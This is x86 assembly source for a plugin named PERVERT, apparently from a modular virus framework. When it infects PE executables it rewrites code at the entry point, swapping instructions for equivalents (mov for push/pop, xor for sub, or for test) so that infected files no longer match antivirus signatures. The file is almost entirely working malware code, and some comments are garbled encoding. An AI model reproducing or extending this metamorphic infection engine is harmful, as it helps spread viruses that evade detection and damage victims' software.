   ; PERVERT
   ; ~~~~~~~
   ; - code pervertor
   ; - perverts PE_PERVERT_SIZE bytes at entrypoint, when infecting PE files

   PE_PERVERT_SIZE         equ     512

   include                 memory.inc
   include                 random.inc
   include                 infect1.inc
   include                 lde32.inc

   include                 plugin.inc
                           PLUGIN_START    PERVERT, CODE32, PERMUTABLE

   handleevent:            hookevent EV_PERVERT_BUF, pervert_buf
                           hookevent EV_INFECT1_AT_ENTRY, pervert_pe
                           stc
                           retn

   ; input: ESI=entryptr

   pervert_pe:             pusha
                           mov     ecx, PE_PERVERT_SIZE
                           event   EV_PERVERT_BUF
                           popa
                           clc
                           retn

   ; input: ESI=buffer, ECX=buffer size

   pervert_buf:            pusha

                           event   EV_RANDOM_RANDOMIZE ; randomize

                           lea     edi, [esi+ecx-32]   ; EDI=lastbyte

                           mov     ecx, 2048
                           event   EV_MEMORY_MALLOC
                           event   EV_LDE32_INIT       ; initialize disassembler

   __pervcycle:            mov     ecx, [esi]          ; get curr. opcode

                           or      cx, cx              ; exit if 00 00
                           je      __exitpervcycle
                           cmp     cx, 25FFh           ; exit if jmp
                           je      __exitpervcycle
                           cmp     cl, 0E9h            ; jmp near
                           je      __exitpervcycle
                           cmp     cl, 0EBh            ; jmp short
                           je      __exitpervcycle
                           push    ecx
                           and     cl, 0F6H            ; C2/C3/CA/CB
                           cmp     cl, 0C2h            ; ret#/ret/retf#/retf
                           pop     ecx
                           je      __exitpervcycle

                           call    pervert_opcode      ; pervert opcode (in ECX)
                           mov     [esi], ecx

                           event   EV_LDE32_DISASM  ; get opcode length (in EAX)
                           cmp     eax, -1           ; cant disasm?
                           je      __exitpervcycle
                           add     esi, eax        ; go to next opcode

                           cmp     esi, edi
                           jb      __pervcycle
   __exitpervcycle:
                           popa
                           clc
                           retn

   ;include                pervlib.inc
   ; ---------------------------------------------------------------------------
   ; PERVERT.LITE library
   ; ---------------------------------------------------------------------------

   ; subroutine:   rnd3
   ; output:       ZF

   rnd3:                   pusha
                           mov     ecx, 3
                           event   EV_RANDOM_RND
                           popa
                           retn

   ; subroutine:   pervert_opcode

   ; input/output: ECX=opcode, 4 bytes
   ; output:       EAX=1,NZ -- ECX has been modified
   ;               EAX=0,ZR -- ECX not changed

   pervert_opcode:

   ; ---------------------------------------------------------------------------

                           mov     al, ch  ; modrm should be of type regreg
                           and     al, 0C0h
                           cmp     al, 0C0h
                           jne     __quit

   ; ---------------------------------------------------------------------------

   ; ¡ë«®:
   ; 100010s1 11xxxyyy     mov     r1, r2

   ; áâ «®:
   ; 01010xxx              push    r2
   ; 01011yyy              pop     r1

                           mov     al, cl          ; mov
                           and     al, 0FDh
                           cmp     al, 089h
                           jne     __x1_skip

                           call    rnd3
                           jz      __x1_skip

                           mov     al, ch
                           mov     ah, ch
                           and     ax, 3807h
                           shr     ah, 3

                           test    cl, 2
                           jnz     __x1_1

                           xchg    al, ah
   __x1_1:
                           or      ax, 5850h       ; push/pop
                           mov     cx, ax

                           jmp     __done

   __x1_skip:

   ; ---------------------------------------------------------------------------

   ; ¨§¬¥¥¨¥: ¨¢¥àâ¨à®¢ âì s, ®¡¬¥ïâì xxx ¨ yyy

   ; 00ttt0sw 11xxxyyy     ttt     r1,r2 (ADD,ADC,AND,OR,SUB,SBB,XOR,CMP)
   ; 100010sw 11xxxyyy     mov     r1,r2

                           mov     al, cl
                           and     al, 11000100b   ; ttt
                           jz      __x2_1

                           mov     al, cl          ; mov
                           and     al, 0FCh
                           cmp     al, 088h
                           jne     __x2_skip
   __x2_1:

                           call    rnd3
                           jz      __x2_skip

                           xor     cl, 2
                           mov     al, ch
                           mov     ah, ch
                           and     ax, 3807h
                           shl     al, 3
                           shr     ah, 3
                           or      al, ah
                           or      al, 0C0h
                           mov     ch, al

                           jmp     __done

   __x2_skip:

   ; ---------------------------------------------------------------------------

   ; if (xxx==yyy)
   ; xor <--> sub, or <--> test

   ; 001100xx 11xxxyyy     xor     r, r
   ; 001010xx 11xxxyyy     sub     r, r
   ; 000010sx 11xxxyyy     or      r, r
   ; 1000010x 11xxxyyy     test    r, r

                           mov     al, ch
                           mov     ah, ch
                           and     ax, 3807h
                           shr     ah, 3
                           cmp     al, ah
                           jne     __x3_skip

                           call    rnd3
                           jz      __x3_skip

                           mov     al, cl
                           and     al, 0FEh
                           cmp     al, 84h         ; test
                           je      __x3_2
                           and     al, 0FCh
                           cmp     al, 08h         ; or
                           je      __x3_3
                           cmp     al, 28h         ; sub
                           je      __x3_1
                           cmp     al, 30h         ; xor
                           je      __x3_1

                           jmp     __x3_skip

   __x3_1:                 xor     cl, 30h xor 28h ; xor <--> sub
                           jmp     __done

   __x3_3:                 and     cl, 0FDh        ; clear s-bit if OR
   __x3_2:                 xor     cl, 08h xor 84h ; or  <--> test
                           jmp     __done

   __x3_skip:

   ; ---------------------------------------------------------------------------

   __quit:                 xor     eax, eax
                           ret

   __done:                 xor     eax, eax
                           inc     eax
                           ret

   ; ---------------------------------------------------------------------------

                           PLUGIN_END
